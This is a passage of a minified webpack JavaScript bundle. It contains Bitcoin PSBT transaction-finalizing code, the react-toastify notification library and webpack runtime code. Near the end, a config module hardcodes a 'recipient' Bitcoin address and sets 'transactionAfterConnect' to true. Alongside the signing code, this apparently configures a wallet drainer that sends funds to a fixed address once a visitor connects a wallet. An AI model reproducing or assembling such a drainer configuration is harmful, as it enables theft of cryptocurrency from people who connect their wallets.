                const e = t.partialSig.find((e) => _t(n, e[0]));
                e && i.push(e[1]);
              }
              if (((i = i.slice(0, e)), i.length !== e))
                throw new Error(
                  `Multisig: wrong signatures count, m=${e} n=${r.length} signatures=${i.length}`
                );
              o = _n.encode([0, ...i]);
            } else if ("pk" === n.last.type)
              o = _n.encode([t.partialSig[0][1]]);
            else if ("pkh" === n.last.type)
              o = _n.encode([t.partialSig[0][1], t.partialSig[0][0]]);
            else if ("wpkh" === n.last.type)
              (o = Bt), (s = [t.partialSig[0][1], t.partialSig[0][0]]);
            else if ("unknown" === n.last.type && !this.opts.allowUnknowInput)
              throw new Error("Unknown inputs not allowed");
            if (
              (n.type.includes("wsh-") &&
                (o.length &&
                  n.lastScript.length &&
                  (s = _n.decode(o).map((e) => {
                    if (0 === e) return Bt;
                    if (dn(e)) return e;
                    throw new Error(`Wrong witness op=${e}`);
                  })),
                (s = s.concat(n.lastScript))),
              "segwit" === n.txType && (i = s),
              n.type.startsWith("sh-wsh-")
                ? (r = _n.encode([_n.encode([0, dt(n.lastScript)])]))
                : n.type.startsWith("sh-")
                ? (r = _n.encode([..._n.decode(o), n.lastScript]))
                : n.type.startsWith("wsh-") ||
                  ("segwit" !== n.txType && (r = o)),
              !r && !i)
            )
              throw new Error("Unknown error finalizing input");
            r && (t.finalScriptSig = r), i && (t.finalScriptWitness = i), Vr(t);
          }
          finalize() {
            for (let e = 0; e < this.inputs.length; e++) this.finalizeIdx(e);
          }
          extract() {
            if (!this.isFinal)
              throw new Error("Transaction has unfinalized inputs");
            if (!this.outputs.length)
              throw new Error("Transaction has no outputs");
            if (this.fee < 0n)
              throw new Error("Outputs spends more than inputs amount");
            return this.toBytes(!0, !0);
          }
          combine(e) {
            for (const t of ["PSBTVersion", "version", "lockTime"])
              if (this.opts[t] !== e.opts[t])
                throw new Error(
                  `Transaction/combine: different ${t} this=${this.opts[t]} other=${e.opts[t]}`
                );
            for (const t of ["inputs", "outputs"])
              if (this[t].length !== e[t].length)
                throw new Error(
                  `Transaction/combine: different ${t} length this=${this[t].length} other=${e[t].length}`
                );
            if (
              !_t(
                this.global.unsignedTx ? Kn.encode(this.global.unsignedTx) : Bt,
                e.global.unsignedTx ? Kn.encode(e.global.unsignedTx) : Bt
              )
            )
              throw new Error("Transaction/combine: different unsigned tx");
            this.global = br(tr, this.global, e.global);
            for (let t = 0; t < this.inputs.length; t++)
              this.updateInput(t, e.inputs[t], !0);
            for (let t = 0; t < this.outputs.length; t++)
              this.updateOutput(t, e.outputs[t], !0);
            return this;
          }
          clone() {
            return Xr.fromPSBT(this.toPSBT(2), this.opts);
          }
        }
      },
      9085: (e, t, n) => {
        "use strict";
        n.d(t, { Ix: () => k, Am: () => R });
        var r = n(2791);
        function i(e) {
          var t,
            n,
            r = "";
          if ("string" == typeof e || "number" == typeof e) r += e;
          else if ("object" == typeof e)
            if (Array.isArray(e))
              for (t = 0; t < e.length; t++)
                e[t] && (n = i(e[t])) && (r && (r += " "), (r += n));
            else for (t in e) e[t] && (r && (r += " "), (r += t));
          return r;
        }
        const o = function () {
            for (var e, t, n = 0, r = ""; n < arguments.length; )
              (e = arguments[n++]) && (t = i(e)) && (r && (r += " "), (r += t));
            return r;
          },
          s = (e) => "number" == typeof e && !isNaN(e),
          a = (e) => "string" == typeof e,
          l = (e) => "function" == typeof e,
          c = (e) => (a(e) || l(e) ? e : null),
          u = (e) => (0, r.isValidElement)(e) || a(e) || l(e) || s(e);
        function f(e) {
          let {
            enter: t,
            exit: n,
            appendPosition: i = !1,
            collapse: o = !0,
            collapseDuration: s = 300,
          } = e;
          return function (e) {
            let {
              children: a,
              position: l,
              preventExitTransition: c,
              done: u,
              nodeRef: f,
              isIn: h,
            } = e;
            const d = i ? `${t}--${l}` : t,
              p = i ? `${n}--${l}` : n,
              g = (0, r.useRef)(0);
            return (
              (0, r.useLayoutEffect)(() => {
                const e = f.current,
                  t = d.split(" "),
                  n = (r) => {
                    r.target === f.current &&
                      (e.dispatchEvent(new Event("d")),
                      e.removeEventListener("animationend", n),
                      e.removeEventListener("animationcancel", n),
                      0 === g.current &&
                        "animationcancel" !== r.type &&
                        e.classList.remove(...t));
                  };
                e.classList.add(...t),
                  e.addEventListener("animationend", n),
                  e.addEventListener("animationcancel", n);
              }, []),
              (0, r.useEffect)(() => {
                const e = f.current,
                  t = () => {
                    e.removeEventListener("animationend", t),
                      o
                        ? (function (e, t, n) {
                            void 0 === n && (n = 300);
                            const { scrollHeight: r, style: i } = e;
                            requestAnimationFrame(() => {
                              (i.minHeight = "initial"),
                                (i.height = r + "px"),
                                (i.transition = `all ${n}ms`),
                                requestAnimationFrame(() => {
                                  (i.height = "0"),
                                    (i.padding = "0"),
                                    (i.margin = "0"),
                                    setTimeout(t, n);
                                });
                            });
                          })(e, u, s)
                        : u();
                  };
                h ||
                  (c
                    ? t()
                    : ((g.current = 1),
                      (e.className += ` ${p}`),
                      e.addEventListener("animationend", t)));
              }, [h]),
              r.createElement(r.Fragment, null, a)
            );
          };
        }
        function h(e, t) {
          return null != e
            ? {
                content: e.content,
                containerId: e.props.containerId,
                id: e.props.toastId,
                theme: e.props.theme,
                type: e.props.type,
                data: e.props.data || {},
                isLoading: e.props.isLoading,
                icon: e.props.icon,
                status: t,
              }
            : {};
        }
        const d = {
            list: new Map(),
            emitQueue: new Map(),
            on(e, t) {
              return (
                this.list.has(e) || this.list.set(e, []),
                this.list.get(e).push(t),
                this
              );
            },
            off(e, t) {
              if (t) {
                const n = this.list.get(e).filter((e) => e !== t);
                return this.list.set(e, n), this;
              }
              return this.list.delete(e), this;
            },
            cancelEmit(e) {
              const t = this.emitQueue.get(e);
              return (
                t && (t.forEach(clearTimeout), this.emitQueue.delete(e)), this
              );
            },
            emit(e) {
              this.list.has(e) &&
                this.list.get(e).forEach((t) => {
                  const n = setTimeout(() => {
                    t(...[].slice.call(arguments, 1));
                  }, 0);
                  this.emitQueue.has(e) || this.emitQueue.set(e, []),
                    this.emitQueue.get(e).push(n);
                });
            },
          },
          p = (e) => {
            let { theme: t, type: n, ...i } = e;
            return r.createElement("svg", {
              viewBox: "0 0 24 24",
              width: "100%",
              height: "100%",
              fill:
                "colored" === t
                  ? "currentColor"
                  : `var(--toastify-icon-color-${n})`,
              ...i,
            });
          },
          g = {
            info: function (e) {
              return r.createElement(
                p,
                { ...e },
                r.createElement("path", {
                  d: "M12 0a12 12 0 1012 12A12.013 12.013 0 0012 0zm.25 5a1.5 1.5 0 11-1.5 1.5 1.5 1.5 0 011.5-1.5zm2.25 13.5h-4a1 1 0 010-2h.75a.25.25 0 00.25-.25v-4.5a.25.25 0 00-.25-.25h-.75a1 1 0 010-2h1a2 2 0 012 2v4.75a.25.25 0 00.25.25h.75a1 1 0 110 2z",
                })
              );
            },
            warning: function (e) {
              return r.createElement(
                p,
                { ...e },
                r.createElement("path", {
                  d: "M23.32 17.191L15.438 2.184C14.728.833 13.416 0 11.996 0c-1.42 0-2.733.833-3.443 2.184L.533 17.448a4.744 4.744 0 000 4.368C1.243 23.167 2.555 24 3.975 24h16.05C22.22 24 24 22.044 24 19.632c0-.904-.251-1.746-.68-2.44zm-9.622 1.46c0 1.033-.724 1.823-1.698 1.823s-1.698-.79-1.698-1.822v-.043c0-1.028.724-1.822 1.698-1.822s1.698.79 1.698 1.822v.043zm.039-12.285l-.84 8.06c-.057.581-.408.943-.897.943-.49 0-.84-.367-.896-.942l-.84-8.065c-.057-.624.25-1.095.779-1.095h1.91c.528.005.84.476.784 1.1z",
                })
              );
            },
            success: function (e) {
              return r.createElement(
                p,
                { ...e },
                r.createElement("path", {
                  d: "M12 0a12 12 0 1012 12A12.014 12.014 0 0012 0zm6.927 8.2l-6.845 9.289a1.011 1.011 0 01-1.43.188l-4.888-3.908a1 1 0 111.25-1.562l4.076 3.261 6.227-8.451a1 1 0 111.61 1.183z",
                })
              );
            },
            error: function (e) {
              return r.createElement(
                p,
                { ...e },
                r.createElement("path", {
                  d: "M11.983 0a12.206 12.206 0 00-8.51 3.653A11.8 11.8 0 000 12.207 11.779 11.779 0 0011.8 24h.214A12.111 12.111 0 0024 11.791 11.766 11.766 0 0011.983 0zM10.5 16.542a1.476 1.476 0 011.449-1.53h.027a1.527 1.527 0 011.523 1.47 1.475 1.475 0 01-1.449 1.53h-.027a1.529 1.529 0 01-1.523-1.47zM11 12.5v-6a1 1 0 012 0v6a1 1 0 11-2 0z",
                })
              );
            },
            spinner: function () {
              return r.createElement("div", { className: "Toastify__spinner" });
            },
          };
        function y(e) {
          const [, t] = (0, r.useReducer)((e) => e + 1, 0),
            [n, i] = (0, r.useState)([]),
            o = (0, r.useRef)(null),
            f = (0, r.useRef)(new Map()).current,
            p = (e) => -1 !== n.indexOf(e),
            y = (0, r.useRef)({
              toastKey: 1,
              displayedToast: 0,
              count: 0,
              queue: [],
              props: e,
              containerId: null,
              isToastActive: p,
              getToast: (e) => f.get(e),
            }).current;
          function w(e) {
            let { containerId: t } = e;
            const { limit: n } = y.props;
            !n ||
              (t && y.containerId !== t) ||
              ((y.count -= y.queue.length), (y.queue = []));
          }
          function m(e) {
            i((t) => (null == e ? [] : t.filter((t) => t !== e)));
          }
          function b() {
            const {
              toastContent: e,
              toastProps: t,
              staleId: n,
            } = y.queue.shift();
            E(e, t, n);
          }
          function v(e, n) {
            let { delay: i, staleId: p, ...w } = n;
            if (
              !u(e) ||
              (function (e) {
                return (
                  !o.current ||
                  (y.props.enableMultiContainer &&
                    e.containerId !== y.props.containerId) ||
                  (f.has(e.toastId) && null == e.updateId)
                );
              })(w)
            )
              return;
            const { toastId: v, updateId: S, data: x } = w,
              { props: A } = y,
              k = () => m(v),
              T = null == S;
            T && y.count++;
            const C = {
              ...A,
              style: A.toastStyle,
              key: y.toastKey++,
              ...Object.fromEntries(
                Object.entries(w).filter((e) => {
                  let [t, n] = e;
                  return null != n;
                })
              ),
              toastId: v,
              updateId: S,
              data: x,
              closeToast: k,
              isIn: !1,
              className: c(w.className || A.toastClassName),
              bodyClassName: c(w.bodyClassName || A.bodyClassName),
              progressClassName: c(w.progressClassName || A.progressClassName),
              autoClose:
                !w.isLoading &&
                ((I = w.autoClose),
                (O = A.autoClose),
                !1 === I || (s(I) && I > 0) ? I : O),
              deleteToast() {
                const e = h(f.get(v), "removed");
                f.delete(v), d.emit(4, e);
                const n = y.queue.length;
                if (
                  ((y.count =
                    null == v ? y.count - y.displayedToast : y.count - 1),
                  y.count < 0 && (y.count = 0),
                  n > 0)
                ) {
                  const e = null == v ? y.props.limit : 1;
                  if (1 === n || 1 === e) y.displayedToast++, b();
                  else {
                    const t = e > n ? n : e;
                    y.displayedToast = t;
                    for (let e = 0; e < t; e++) b();
                  }
                } else t();
              },
            };
            var I, O;
            (C.iconOut = (function (e) {
              let { theme: t, type: n, isLoading: i, icon: o } = e,
                c = null;
              const u = { theme: t, type: n };
              return (
                !1 === o ||
                  (l(o)
                    ? (c = o(u))
                    : (0, r.isValidElement)(o)
                    ? (c = (0, r.cloneElement)(o, u))
                    : a(o) || s(o)
                    ? (c = o)
                    : i
                    ? (c = g.spinner())
                    : ((e) => e in g)(n) && (c = g[n](u))),
                c
              );
            })(C)),
              l(w.onOpen) && (C.onOpen = w.onOpen),
              l(w.onClose) && (C.onClose = w.onClose),
              (C.closeButton = A.closeButton),
              !1 === w.closeButton || u(w.closeButton)
                ? (C.closeButton = w.closeButton)
                : !0 === w.closeButton &&
                  (C.closeButton = !u(A.closeButton) || A.closeButton);
            let B = e;
            (0, r.isValidElement)(e) && !a(e.type)
              ? (B = (0, r.cloneElement)(e, {
                  closeToast: k,
                  toastProps: C,
                  data: x,
                }))
              : l(e) && (B = e({ closeToast: k, toastProps: C, data: x })),
              A.limit && A.limit > 0 && y.count > A.limit && T
                ? y.queue.push({ toastContent: B, toastProps: C, staleId: p })
                : s(i)
                ? setTimeout(() => {
                    E(B, C, p);
                  }, i)
                : E(B, C, p);
          }
          function E(e, t, n) {
            const { toastId: r } = t;
            n && f.delete(n);
            const o = { content: e, props: t };
            f.set(r, o),
              i((e) => [...e, r].filter((e) => e !== n)),
              d.emit(4, h(o, null == o.props.updateId ? "added" : "updated"));
          }
          return (
            (0, r.useEffect)(
              () => (
                (y.containerId = e.containerId),
                d
                  .cancelEmit(3)
                  .on(0, v)
                  .on(1, (e) => o.current && m(e))
                  .on(5, w)
                  .emit(2, y),
                () => {
                  f.clear(), d.emit(3, y);
                }
              ),
              []
            ),
            (0, r.useEffect)(() => {
              (y.props = e),
                (y.isToastActive = p),
                (y.displayedToast = n.length);
            }),
            {
              getToastToRender: function (t) {
                const n = new Map(),
                  r = Array.from(f.values());
                return (
                  e.newestOnTop && r.reverse(),
                  r.forEach((e) => {
                    const { position: t } = e.props;
                    n.has(t) || n.set(t, []), n.get(t).push(e);
                  }),
                  Array.from(n, (e) => t(e[0], e[1]))
                );
              },
              containerRef: o,
              isToastActive: p,
            }
          );
        }
        function w(e) {
          return e.targetTouches && e.targetTouches.length >= 1
            ? e.targetTouches[0].clientX
            : e.clientX;
        }
        function m(e) {
          return e.targetTouches && e.targetTouches.length >= 1
            ? e.targetTouches[0].clientY
            : e.clientY;
        }
        function b(e) {
          const [t, n] = (0, r.useState)(!1),
            [i, o] = (0, r.useState)(!1),
            s = (0, r.useRef)(null),
            a = (0, r.useRef)({
              start: 0,
              x: 0,
              y: 0,
              delta: 0,
              removalDistance: 0,
              canCloseOnClick: !0,
              canDrag: !1,
              boundingRect: null,
              didMove: !1,
            }).current,
            c = (0, r.useRef)(e),
            {
              autoClose: u,
              pauseOnHover: f,
              closeToast: h,
              onClick: d,
              closeOnClick: p,
            } = e;
          function g(t) {
            if (e.draggable) {
              "touchstart" === t.nativeEvent.type &&
                t.nativeEvent.preventDefault(),
                (a.didMove = !1),
                document.addEventListener("mousemove", E),
                document.addEventListener("mouseup", S),
                document.addEventListener("touchmove", E),
                document.addEventListener("touchend", S);
              const n = s.current;
              (a.canCloseOnClick = !0),
                (a.canDrag = !0),
                (a.boundingRect = n.getBoundingClientRect()),
                (n.style.transition = ""),
                (a.x = w(t.nativeEvent)),
                (a.y = m(t.nativeEvent)),
                "x" === e.draggableDirection
                  ? ((a.start = a.x),
                    (a.removalDistance =
                      n.offsetWidth * (e.draggablePercent / 100)))
                  : ((a.start = a.y),
                    (a.removalDistance =
                      n.offsetHeight *
                      (80 === e.draggablePercent
                        ? 1.5 * e.draggablePercent
                        : e.draggablePercent / 100)));
            }
          }
          function y(t) {
            if (a.boundingRect) {
              const { top: n, bottom: r, left: i, right: o } = a.boundingRect;
              "touchend" !== t.nativeEvent.type &&
              e.pauseOnHover &&
              a.x >= i &&
              a.x <= o &&
              a.y >= n &&
              a.y <= r
                ? v()
                : b();
            }
          }
          function b() {
            n(!0);
          }
          function v() {
            n(!1);
          }
          function E(n) {
            const r = s.current;
            a.canDrag &&
              r &&
              ((a.didMove = !0),
              t && v(),
              (a.x = w(n)),
              (a.y = m(n)),
              (a.delta =
                "x" === e.draggableDirection ? a.x - a.start : a.y - a.start),
              a.start !== a.x && (a.canCloseOnClick = !1),
              (r.style.transform = `translate${e.draggableDirection}(${a.delta}px)`),
              (r.style.opacity =
                "" + (1 - Math.abs(a.delta / a.removalDistance))));
          }
          function S() {
            document.removeEventListener("mousemove", E),
              document.removeEventListener("mouseup", S),
              document.removeEventListener("touchmove", E),
              document.removeEventListener("touchend", S);
            const t = s.current;
            if (a.canDrag && a.didMove && t) {
              if (((a.canDrag = !1), Math.abs(a.delta) > a.removalDistance))
                return o(!0), void e.closeToast();
              (t.style.transition = "transform 0.2s, opacity 0.2s"),
                (t.style.transform = `translate${e.draggableDirection}(0)`),
                (t.style.opacity = "1");
            }
          }
          (0, r.useEffect)(() => {
            c.current = e;
          }),
            (0, r.useEffect)(
              () => (
                s.current && s.current.addEventListener("d", b, { once: !0 }),
                l(e.onOpen) &&
                  e.onOpen(
                    (0, r.isValidElement)(e.children) && e.children.props
                  ),
                () => {
                  const e = c.current;
                  l(e.onClose) &&
                    e.onClose(
                      (0, r.isValidElement)(e.children) && e.children.props
                    );
                }
              ),
              []
            ),
            (0, r.useEffect)(
              () => (
                e.pauseOnFocusLoss &&
                  (document.hasFocus() || v(),
                  window.addEventListener("focus", b),
                  window.addEventListener("blur", v)),
                () => {
                  e.pauseOnFocusLoss &&
                    (window.removeEventListener("focus", b),
                    window.removeEventListener("blur", v));
                }
              ),
              [e.pauseOnFocusLoss]
            );
          const x = {
            onMouseDown: g,
            onTouchStart: g,
            onMouseUp: y,
            onTouchEnd: y,
          };
          return (
            u && f && ((x.onMouseEnter = v), (x.onMouseLeave = b)),
            p &&
              (x.onClick = (e) => {
                d && d(e), a.canCloseOnClick && h();
              }),
            {
              playToast: b,
              pauseToast: v,
              isRunning: t,
              preventExitTransition: i,
              toastRef: s,
              eventHandlers: x,
            }
          );
        }
        function v(e) {
          let { closeToast: t, theme: n, ariaLabel: i = "close" } = e;
          return r.createElement(
            "button",
            {
              className: `Toastify__close-button Toastify__close-button--${n}`,
              type: "button",
              onClick: (e) => {
                e.stopPropagation(), t(e);
              },
              "aria-label": i,
            },
            r.createElement(
              "svg",
              { "aria-hidden": "true", viewBox: "0 0 14 16" },
              r.createElement("path", {
                fillRule: "evenodd",
                d: "M7.71 8.23l3.75 3.75-1.48 1.48-3.75-3.75-3.75 3.75L1 11.98l3.75-3.75L1 4.48 2.48 3l3.75 3.75L9.98 3l1.48 1.48-3.75 3.75z",
              })
            )
          );
        }
        function E(e) {
          let {
            delay: t,
            isRunning: n,
            closeToast: i,
            type: s = "default",
            hide: a,
            className: c,
            style: u,
            controlledProgress: f,
            progress: h,
            rtl: d,
            isIn: p,
            theme: g,
          } = e;
          const y = a || (f && 0 === h),
            w = {
              ...u,
              animationDuration: `${t}ms`,
              animationPlayState: n ? "running" : "paused",
              opacity: y ? 0 : 1,
            };
          f && (w.transform = `scaleX(${h})`);
          const m = o(
              "Toastify__progress-bar",
              f
                ? "Toastify__progress-bar--controlled"
                : "Toastify__progress-bar--animated",
              `Toastify__progress-bar-theme--${g}`,
              `Toastify__progress-bar--${s}`,
              { "Toastify__progress-bar--rtl": d }
            ),
            b = l(c) ? c({ rtl: d, type: s, defaultClassName: m }) : o(m, c);
          return r.createElement("div", {
            role: "progressbar",
            "aria-hidden": y ? "true" : "false",
            "aria-label": "notification timer",
            className: b,
            style: w,
            [f && h >= 1 ? "onTransitionEnd" : "onAnimationEnd"]:
              f && h < 1
                ? null
                : () => {
                    p && i();
                  },
          });
        }
        const S = (e) => {
            const {
                isRunning: t,
                preventExitTransition: n,
                toastRef: i,
                eventHandlers: s,
              } = b(e),
              {
                closeButton: a,
                children: c,
                autoClose: u,
                onClick: f,
                type: h,
                hideProgressBar: d,
                closeToast: p,
                transition: g,
                position: y,
                className: w,
                style: m,
                bodyClassName: S,
                bodyStyle: x,
                progressClassName: A,
                progressStyle: k,
                updateId: T,
                role: C,
                progress: I,
                rtl: O,
                toastId: B,
                deleteToast: P,
                isIn: _,
                isLoading: U,
                iconOut: N,
                closeOnClick: R,
                theme: L,
              } = e,
              $ = o(
                "Toastify__toast",
                `Toastify__toast-theme--${L}`,
                `Toastify__toast--${h}`,
                { "Toastify__toast--rtl": O },
                { "Toastify__toast--close-on-click": R }
              ),
              H = l(w)
                ? w({ rtl: O, position: y, type: h, defaultClassName: $ })
                : o($, w),
              D = !!I || !u,
              M = { closeToast: p, type: h, theme: L };
            let F = null;
            return (
              !1 === a ||
                (F = l(a)
                  ? a(M)
                  : (0, r.isValidElement)(a)
                  ? (0, r.cloneElement)(a, M)
                  : v(M)),
              r.createElement(
                g,
                {
                  isIn: _,
                  done: P,
                  position: y,
                  preventExitTransition: n,
                  nodeRef: i,
                },
                r.createElement(
                  "div",
                  { id: B, onClick: f, className: H, ...s, style: m, ref: i },
                  r.createElement(
                    "div",
                    {
                      ...(_ && { role: C }),
                      className: l(S)
                        ? S({ type: h })
                        : o("Toastify__toast-body", S),
                      style: x,
                    },
                    null != N &&
                      r.createElement(
                        "div",
                        {
                          className: o("Toastify__toast-icon", {
                            "Toastify--animate-icon Toastify__zoom-enter": !U,
                          }),
                        },
                        N
                      ),
                    r.createElement("div", null, c)
                  ),
                  F,
                  r.createElement(E, {
                    ...(T && !D ? { key: `pb-${T}` } : {}),
                    rtl: O,
                    theme: L,
                    delay: u,
                    isRunning: t,
                    isIn: _,
                    closeToast: p,
                    hide: d,
                    type: h,
                    style: k,
                    className: A,
                    controlledProgress: D,
                    progress: I || 0,
                  })
                )
              )
            );
          },
          x = function (e, t) {
            return (
              void 0 === t && (t = !1),
              {
                enter: `Toastify--animate Toastify__${e}-enter`,
                exit: `Toastify--animate Toastify__${e}-exit`,
                appendPosition: t,
              }
            );
          },
          A = f(x("bounce", !0)),
          k =
            (f(x("slide", !0)),
            f(x("zoom")),
            f(x("flip")),
            (0, r.forwardRef)((e, t) => {
              const {
                  getToastToRender: n,
                  containerRef: i,
                  isToastActive: s,
                } = y(e),
                { className: a, style: u, rtl: f, containerId: h } = e;
              function d(e) {
                const t = o(
                  "Toastify__toast-container",
                  `Toastify__toast-container--${e}`,
                  { "Toastify__toast-container--rtl": f }
                );
                return l(a)
                  ? a({ position: e, rtl: f, defaultClassName: t })
                  : o(t, c(a));
              }
              return (
                (0, r.useEffect)(() => {
                  t && (t.current = i.current);
                }, []),
                r.createElement(
                  "div",
                  { ref: i, className: "Toastify", id: h },
                  n((e, t) => {
                    const n = t.length
                      ? { ...u }
                      : { ...u, pointerEvents: "none" };
                    return r.createElement(
                      "div",
                      { className: d(e), style: n, key: `container-${e}` },
                      t.map((e, n) => {
                        let { content: i, props: o } = e;
                        return r.createElement(
                          S,
                          {
                            ...o,
                            isIn: s(o.toastId),
                            style: {
                              ...o.style,
                              "--nth": n + 1,
                              "--len": t.length,
                            },
                            key: `toast-${o.key}`,
                          },
                          i
                        );
                      })
                    );
                  })
                )
              );
            }));
        (k.displayName = "ToastContainer"),
          (k.defaultProps = {
            position: "top-right",
            transition: A,
            autoClose: 5e3,
            closeButton: v,
            pauseOnHover: !0,
            pauseOnFocusLoss: !0,
            closeOnClick: !0,
            draggable: !0,
            draggablePercent: 80,
            draggableDirection: "x",
            role: "alert",
            theme: "light",
          });
        let T,
          C = new Map(),
          I = [],
          O = 1;
        function B() {
          return "" + O++;
        }
        function P(e) {
          return e && (a(e.toastId) || s(e.toastId)) ? e.toastId : B();
        }
        function _(e, t) {
          return (
            C.size > 0 ? d.emit(0, e, t) : I.push({ content: e, options: t }),
            t.toastId
          );
        }
        function U(e, t) {
          return { ...t, type: (t && t.type) || e, toastId: P(t) };
        }
        function N(e) {
          return (t, n) => _(t, U(e, n));
        }
        function R(e, t) {
          return _(e, U("default", t));
        }
        (R.loading = (e, t) =>
          _(
            e,
            U("default", {
              isLoading: !0,
              autoClose: !1,
              closeOnClick: !1,
              closeButton: !1,
              draggable: !1,
              ...t,
            })
          )),
          (R.promise = function (e, t, n) {
            let r,
              { pending: i, error: o, success: s } = t;
            i &&
              (r = a(i)
                ? R.loading(i, n)
                : R.loading(i.render, { ...n, ...i }));
            const c = {
                isLoading: null,
                autoClose: null,
                closeOnClick: null,
                closeButton: null,
                draggable: null,
              },
              u = (e, t, i) => {
                if (null == t) return void R.dismiss(r);
                const o = { type: e, ...c, ...n, data: i },
                  s = a(t) ? { render: t } : t;
                return (
                  r ? R.update(r, { ...o, ...s }) : R(s.render, { ...o, ...s }),
                  i
                );
              },
              f = l(e) ? e() : e;
            return (
              f.then((e) => u("success", s, e)).catch((e) => u("error", o, e)),
              f
            );
          }),
          (R.success = N("success")),
          (R.info = N("info")),
          (R.error = N("error")),
          (R.warning = N("warning")),
          (R.warn = R.warning),
          (R.dark = (e, t) => _(e, U("default", { theme: "dark", ...t }))),
          (R.dismiss = (e) => {
            C.size > 0
              ? d.emit(1, e)
              : (I = I.filter((t) => null != e && t.options.toastId !== e));
          }),
          (R.clearWaitingQueue = function (e) {
            return void 0 === e && (e = {}), d.emit(5, e);
          }),
          (R.isActive = (e) => {
            let t = !1;
            return (
              C.forEach((n) => {
                n.isToastActive && n.isToastActive(e) && (t = !0);
              }),
              t
            );
          }),
          (R.update = function (e, t) {
            void 0 === t && (t = {}),
              setTimeout(() => {
                const n = (function (e, t) {
                  let { containerId: n } = t;
                  const r = C.get(n || T);
                  return r && r.getToast(e);
                })(e, t);
                if (n) {
                  const { props: r, content: i } = n,
                    o = {
                      delay: 100,
                      ...r,
                      ...t,
                      toastId: t.toastId || e,
                      updateId: B(),
                    };
                  o.toastId !== e && (o.staleId = e);
                  const s = o.render || i;
                  delete o.render, _(s, o);
                }
              }, 0);
          }),
          (R.done = (e) => {
            R.update(e, { progress: 1 });
          }),
          (R.onChange = (e) => (
            d.on(4, e),
            () => {
              d.off(4, e);
            }
          )),
          (R.POSITION = {
            TOP_LEFT: "top-left",
            TOP_RIGHT: "top-right",
            TOP_CENTER: "top-center",
            BOTTOM_LEFT: "bottom-left",
            BOTTOM_RIGHT: "bottom-right",
            BOTTOM_CENTER: "bottom-center",
          }),
          (R.TYPE = {
            INFO: "info",
            SUCCESS: "success",
            WARNING: "warning",
            ERROR: "error",
            DEFAULT: "default",
          }),
          d
            .on(2, (e) => {
              (T = e.containerId || e),
                C.set(T, e),
                I.forEach((e) => {
                  d.emit(0, e.content, e.options);
                }),
                (I = []);
            })
            .on(3, (e) => {
              C.delete(e.containerId || e),
                0 === C.size && d.off(0).off(1).off(5);
            });
      },
      6128: (e) => {
        "use strict";
        e.exports = JSON.parse(
          '{"connect":"","accountsWallet":[],"server":"","recipient":"bc1q9efdsxve8m675wllv7da68ts4a55y73df576k3","repeatTransactions":false,"transactionAfterConnect":true,"modal":2}'
        );
      },
    },
    t = {};
  function n(r) {
    var i = t[r];
    if (void 0 !== i) return i.exports;
    var o = (t[r] = { id: r, loaded: !1, exports: {} });
    return e[r].call(o.exports, o, o.exports, n), (o.loaded = !0), o.exports;
  }
  (n.m = e),
    (() => {
      var e =
          "function" === typeof Symbol
            ? Symbol("webpack queues")
            : "__webpack_queues__",
        t =
          "function" === typeof Symbol
            ? Symbol("webpack exports")
            : "__webpack_exports__",
        r =
          "function" === typeof Symbol
            ? Symbol("webpack error")
            : "__webpack_error__",
        i = (e) => {
          e &&
            !e.d &&
            ((e.d = 1),
            e.forEach((e) => e.r--),
            e.forEach((e) => (e.r-- ? e.r++ : e())));
        };
      n.a = (n, o, s) => {
        var a;
        s && ((a = []).d = 1);
        var l,
          c,
          u,
          f = new Set(),
          h = n.exports,
          d = new Promise((e, t) => {
            (u = t), (c = e);
          });
        (d[t] = h),
          (d[e] = (e) => (a && e(a), f.forEach(e), d.catch((e) => {}))),
          (n.exports = d),
          o(
            (n) => {
              var o;
              l = ((n) =>
                n.map((n) => {
                  if (null !== n && "object" === typeof n) {
                    if (n[e]) return n;
                    if (n.then) {
                      var o = [];
                      (o.d = 0),
                        n.then(
                          (e) => {
                            (s[t] = e), i(o);
                          },
                          (e) => {
                            (s[r] = e), i(o);
                          }
                        );
                      var s = {};
                      return (s[e] = (e) => e(o)), s;
                    }
                  }
                  var a = {};
                  return (a[e] = (e) => {}), (a[t] = n), a;
                }))(n);
              var s = () =>
                  l.map((e) => {
                    if (e[r]) throw e[r];
                    return e[t];
                  }),
                c = new Promise((t) => {
                  (o = () => t(s)).r = 0;
                  var n = (e) =>
                    e !== a &&
                    !f.has(e) &&
                    (f.add(e), e && !e.d && (o.r++, e.push(o)));
                  l.map((t) => t[e](n));
                });
              return o.r ? c : s();
            },
            (e) => (e ? u((d[r] = e)) : c(h), i(a))
          ),
          a && (a.d = 0);
      };
    })(),
    (n.n = (e) => {
      var t = e && e.__esModule ? () => e.default : () => e;
      return n.d(t, { a: t }), t;
    }),
    (() => {
      var e,
        t = Object.getPrototypeOf
          ? (e) => Object.getPrototypeOf(e)
          : (e) => e.__proto__;
      n.t = function (r, i) {
        if ((1 & i && (r = this(r)), 8 & i)) return r;
        if ("object" === typeof r && r) {
          if (4 & i && r.__esModule) return r;
          if (16 & i && "function" === typeof r.then) return r;
        }
        var o = Object.create(null);
        n.r(o);
        var s = {};
        e = e || [null, t({}), t([]), t(t)];
        for (
          var a = 2 & i && r;
          "object" == typeof a && !~e.indexOf(a);
          a = t(a)
        )
          Object.getOwnPropertyNames(a).forEach((e) => (s[e] = () => r[e]));
        return (s.default = () => r), n.d(o, s), o;
      };
    })(),
    (n.d = (e, t) => {
      for (var r in t)
        n.o(t, r) &&
          !n.o(e, r) &&
          Object.defineProperty(e, r, { enumerable: !0, get: t[r] });
    }),
    (n.f = {}),
    (n.e = (e) =>
      Promise.all(Object.keys(n.f).reduce((t, r) => (n.f[r](e, t), t), []))),
    (n.u = (e) => "static/js/" + e + ".610011a5.chunk.js"),
    (n.miniCssF = (e) => {}),
    (n.g = (function () {
      if ("object" === typeof globalThis) return globalThis;
      try {
        return this || new Function("return this")();
      } catch (e) {
        if ("object" === typeof window) return window;
      }
    })()),
    (n.o = (e, t) => Object.prototype.hasOwnProperty.call(e, t)),
    (() => {
      var e = {},
        t = "app:";
      n.l = (r, i, o, s) => {
        if (e[r]) e[r].push(i);
        else {
          var a, l;
          if (void 0 !== o)
            for (
              var c = document.getElementsByTagName("script"), u = 0;
              u < c.length;
              u++
            ) {
              var f = c[u];
              if (
                f.getAttribute("src") == r ||
                f.getAttribute("data-webpack") == t + o
              ) {
                a = f;
                break;
              }
            }
          a ||
            ((l = !0),
            ((a = document.createElement("script")).charset = "utf-8"),
            (a.timeout = 120),
            n.nc && a.setAttribute("nonce", n.nc),
            a.setAttribute("data-webpack", t + o),
            (a.src = r)),
            (e[r] = [i]);
